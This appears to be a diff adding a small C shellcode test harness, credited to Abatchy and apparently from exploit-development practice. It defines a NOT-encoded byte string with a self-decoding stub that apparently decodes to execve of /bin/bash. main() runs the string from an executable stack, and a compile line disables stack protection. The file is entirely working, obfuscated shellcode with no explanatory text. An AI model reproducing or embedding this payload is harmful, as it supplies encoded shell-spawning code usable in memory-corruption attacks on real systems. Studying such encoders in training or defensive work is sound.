@@ -1,0 +1,17 @@
+/*
+ NOTExecveBashStack.c
+By Abatchy
+gcc NOTExecveBashStack.c -fno-stack-protector -z execstack -o NOTExecveBashStack.out
+*/
+
+#include <stdio.h>
+#include <string.h>
+
+unsigned char sc[] = "\xeb\x0c\x5e\x8a\x06\xf6\x16\xfe\xc0\x74\x08\x46\xeb\xf5\xe8\xef\xff\xff\xff\xce\x3f\xaf\x97\x9d\x9e\x8c\x97\x97\x9d\x96\x91\xd0\x97\xd0\xd0\xd0\xd0\x76\x1c\xaf\x76\x1d\xac\x76\x1e\x4f\xf4\x32\x7f\xff";
+
+int main()
+{
+    printf("Shellcode size: %d\n", strlen(sc));
+    int (*ret)() = (int(*)())sc;
+    ret();
+}
